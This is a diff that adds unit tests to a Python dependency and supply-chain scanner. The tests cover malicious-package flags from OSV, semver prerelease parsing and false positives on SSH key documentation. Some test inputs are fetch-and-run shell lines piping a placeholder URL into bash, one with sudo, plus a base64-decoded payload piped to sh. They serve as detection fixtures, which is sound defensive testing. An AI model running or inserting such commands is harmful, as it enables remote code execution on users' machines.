@@ -235,3 +235,42 @@ class OsvPolicy(unittest.TestCase):
 if __name__ == "__main__":
     unittest.main()
 
+class Followups38(unittest.TestCase):
+    def test_unknown_spec_unbounded_mal_is_malicious(self):
+        vulns = [{"id": "MAL-2025-7777", "affected": [{"ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}]}]}]
+        orig = S.osv_query
+        S.osv_query = lambda e, n, v=None: vulns
+        try:
+            out = []
+            S.check_typos_and_osv([("dependencies", "acme-helper-x", "*")], "npm", out, file="package.json")
+        finally:
+            S.osv_query = orig
+        self.assertTrue(any(f["severity"] == "malicious" for f in out), out)
+
+    def test_prerelease_next_and_build_metadata(self):
+        pre = S.parse_semver("1.95.8-next.1")
+        rel = S.parse_semver("1.95.8")
+        built = S.parse_semver("1.95.8+sha.1")
+        self.assertIsNotNone(pre)
+        self.assertTrue(pre < rel)
+        self.assertEqual(built, rel)
+        self.assertTrue(S.parse_semver("1.95.8-0") < rel)
+        self.assertTrue(S.parse_semver("1.95.8-canary.3") < rel)
+
+    def test_pipe_abs_bash_sudo_and_base64(self):
+        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://e.example/x | /bin/bash\n")
+        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
+        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://e.example/x | sudo -E bash -\n")
+        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
+        fs = findings_of(S.check_shell_and_docker, "install.sh", "echo YWJj | base64 -d | sh\n")
+        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
+
+    def test_unparseable_package_json_is_medium(self):
+        fs = findings_of(S.check_package_json, "package.json", '{"name":"r", // comment\n}')
+        self.assertTrue(any("unparseable manifest" in f["detail"] and f["severity"] == "medium" for f in fs), fs)
+
+    def test_ssh_private_key_docs_are_not_seed_asks(self):
+        text = "Provide the SSH private key path in ~/.ssh/id_rsa to clone the repo."
+        fs = findings_of(S.check_secrets_and_network, "ssh/README.md", text, set())
+        self.assertFalse(any(f["check"] == "permissions" for f in fs), fs)
+
